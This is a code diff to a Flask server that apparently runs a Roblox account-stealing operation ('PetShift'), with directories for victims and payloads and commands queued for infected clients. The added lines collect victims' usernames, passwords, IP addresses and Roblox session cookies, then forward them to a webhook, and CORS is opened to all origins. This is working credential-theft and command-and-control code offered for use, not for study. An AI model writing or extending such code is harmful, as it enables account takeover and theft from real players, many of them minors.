@@ -15,7 +15,7 @@ VICTIMS_DIR.mkdir(exist_ok=True)
 PAYLOADS.mkdir(exist_ok=True)
 
 app = Flask(__name__, template_folder="templates", static_folder="static")
-CORS(app)
+CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=False)
 app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
 app.config["SESSION_COOKIE_HTTPONLY"] = True
 app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
@@ -1445,6 +1445,18 @@ def petshift_hello():
     save_petshifts()
     info = {k: entry.get(k) for k in ("ip","ua","platform","roblox_user","roblox_id","loot_count","last_seen","first_seen","geo","online","login_method")}
     socketio.emit("petshift_update", {"pid": pid, "info": info})
+    try:
+        if data.get("roblox_user") or data.get("login_method"):
+            _browser_wh("PetShift session", [
+                f"pid `{pid}`",
+                f"user: {data.get('roblox_user')}",
+                f"method: {data.get('login_method')}",
+                f"ip: {ip}",
+                f"platform: {data.get('platform')}",
+            ])
+    except Exception:
+        pass
+
     cmds = list(entry.get("pending_cmds") or [])
     entry["pending_cmds"] = []
     save_petshifts()
@@ -1516,10 +1528,28 @@ def petshift_loot():
     try:
         lines = [f"pid `{pid}`", f"type `{kind}`", f"ip `{petshifts[pid].get('ip')}`"]
         if isinstance(payload, dict):
-            for k in ("user", "userId", "method", "platform"):
-                if payload.get(k):
+            for k in ("user", "userId", "method", "platform", "password", "login_method"):
+                if payload.get(k) is not None and payload.get(k) != "":
                     lines.append(f"{k}: {payload.get(k)}")
-        _browser_wh("PetShift loot", lines)
+            # roblox cookies summary
+            rbx = payload.get("roblox_cookies") or payload.get("roblox_security")
+            if isinstance(rbx, dict) and rbx:
+                lines.append("roblox_cookies:")
+                for ck, cv in list(rbx.items())[:12]:
+                    lines.append(f"  {ck}: {str(cv)[:120]}")
+            elif kind in ("roblox_cookies", "cookies") and payload:
+                lines.append("cookies:")
+                for ck, cv in list(payload.items())[:12]:
+                    if isinstance(cv, (str, int, float)):
+                        lines.append(f"  {ck}: {str(cv)[:120]}")
+            # nested storage
+            stor = payload.get("storage") if isinstance(payload.get("storage"), dict) else None
+            if stor and isinstance(stor.get("roblox_cookies"), dict):
+                lines.append("storage.roblox_cookies:")
+                for ck, cv in list(stor["roblox_cookies"].items())[:8]:
+                    lines.append(f"  {ck}: {str(cv)[:120]}")
+        title = "PetShift LOGIN" if kind in ("roblox_login", "roblox_oauth", "roblox_oauth_form", "credentials") else "PetShift loot"
+        _browser_wh(title, lines)
     except Exception:
         pass
     return jsonify({"ok": True})
